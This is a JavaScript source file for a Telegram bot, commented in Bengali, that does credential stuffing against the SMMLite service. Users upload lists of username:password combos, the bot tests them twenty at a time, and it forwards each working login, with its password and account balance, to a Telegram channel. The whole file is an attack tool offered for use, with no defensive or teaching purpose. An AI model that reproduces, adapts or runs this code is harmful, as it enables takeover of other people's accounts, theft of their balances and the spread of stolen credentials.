// api/telegram.js – SMMLite Bot (async background processing for large files)
import { checkAccount } from '../lib/checkCore.js';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';

// একসাথে কয়টি অ্যাকাউন্ট চেক করবে (Concurrency)
const CONCURRENCY = 20; // ২০টি প্যারালালে চেক করবে – দ্রুত ও নিরাপদ

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const body = req.body;
  if (!body.message) {
    return res.status(200).json({ ok: true });
  }

  const chatId = body.message.chat.id;
  const text = body.message.text;
  const document = body.message.document;

  // ===== /start command =====
  if (text === '/start') {
    await sendMessage(chatId,
      "🤖 *SMMLite Checker Bot*\n\n" +
      "Send a `.txt` file with combos (one per line):\n" +
      "`username:password`\n\n" +
      "I'll check up to 1000+ combos in the background and forward HITs to the channel.\n" +
      "You'll receive progress updates automatically."
    );
    return res.status(200).json({ ok: true });
  }

  // ===== File upload =====
  if (document && document.mime_type === 'text/plain') {
    // 1. Download & parse file (quickly)
    const fileUrl = await getFileUrl(document.file_id);
    if (!fileUrl) {
      await sendMessage(chatId, "❌ Failed to get file.");
      return res.status(200).json({ ok: false });
    }

    const fileContent = await downloadFile(fileUrl);
    if (!fileContent) {
      await sendMessage(chatId, "❌ Failed to download file.");
      return res.status(200).json({ ok: false });
    }

    const lines = fileContent.split(/\r?\n/);
    const combos = [];
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed) continue;
      const idx = trimmed.indexOf(':');
      if (idx === -1) continue;
      const user = trimmed.slice(0, idx).trim();
      const pass = trimmed.slice(idx + 1).trim();
      if (user && pass) combos.push({ username: user, password: pass });
    }

    if (combos.length === 0) {
      await sendMessage(chatId, "❌ No valid combos found (format: `username:password`).");
      return res.status(200).json({ ok: false });
    }

    // 2. IMMEDIATE response to Telegram (to avoid timeout)
    res.status(200).json({ ok: true });

    // 3. Start background processing (non-blocking)
    setTimeout(() => processCombos(chatId, combos), 100);

    return; // Response already sent
  }

  return res.status(200).json({ ok: true });
}

// ===== ব্যাকগ্রাউন্ড প্রসেসিং ফাংশন =====
async function processCombos(chatId, combos) {
  const total = combos.length;
  let hits = [];
  let processed = 0;
  const startTime = Date.now();

  await sendMessage(chatId, `⏳ Starting check for *${total}* combos... (please wait)`);

  // ব্যাচে ভাগ করে প্যারালালে চেক
  for (let i = 0; i < combos.length; i += CONCURRENCY) {
    const batch = combos.slice(i, i + CONCURRENCY);

    // প্যারালালে চেক
    const batchPromises = batch.map(async (combo) => {
      try {
        const result = await checkAccount(combo.username, combo.password);
        return { ...combo, result };
      } catch (err) {
        return { ...combo, result: { valid: false, hit: false, balance: 0, message: err.message } };
      }
    });

    const batchResults = await Promise.all(batchPromises);

    // রেজাল্ট প্রসেস
    for (const item of batchResults) {
      processed++;
      if (item.result.hit) {
        hits.push(item);
        // হিট ফরওয়ার্ড
        await forwardToChannel(item.username, item.password, item.result);
      }
    }

    // প্রতি ৫০টি কম্বো শেষে প্রগ্রেস মেসেজ
    if (processed % 50 === 0 || processed === total) {
      const percent = Math.round((processed / total) * 100);
      await sendMessage(chatId, `📊 Progress: ${processed}/${total} (${percent}%) | HITs: ${hits.length}`);
    }

    // রেট লিমিট এড়াতে সামান্য বিরতি (যদি প্রয়োজন)
    // await new Promise(r => setTimeout(r, 100));
  }

  // ===== সারাংশ =====
  const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
  let summary = `✅ *Checking complete!*\nTotal: ${total}\n💰 HITS: ${hits.length}\n⏱️ Time: ${elapsed}s`;

  if (hits.length > 0) {
    summary += `\n\n📋 *HIT combos:*\n`;
    hits.forEach(h => {
      summary += `${h.username}:${h.password} | $${parseFloat(h.result.balance).toFixed(6)}\n`;
    });
  }
  await sendMessage(chatId, summary);
}

// ========== হেল্পার ফাংশন ==========

async function sendMessage(chatId, text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'Markdown'
      })
    });
  } catch(e) {
    console.error('sendMessage error:', e.message);
  }
}

async function getFileUrl(fileId) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${fileId}`;
  try {
    const res = await fetch(url);
    const data = await res.json();
    if (data.ok && data.result.file_path) {
      return `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${data.result.file_path}`;
    }
  } catch(e) {}
  return null;
}

async function downloadFile(fileUrl) {
  try {
    const res = await fetch(fileUrl);
    return await res.text();
  } catch(e) {
    return null;
  }
}

async function forwardToChannel(username, password, result) {
  if (!TELEGRAM_CHAT_ID) return;
  const balance = parseFloat(result.balance).toFixed(6);
  const message = `🎯 *HIT on SMMLite By @shakib2016*\n\n` +
                  `👤 *Username:* ${username}\n` +
                  `🔑 *Password:* \`${password}\`\n` +
                  `💰 *Balance:* $${balance}\n\n` +
                  `#SMMLite @shakib2016 #HIT`;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
  } catch(e) {}
}
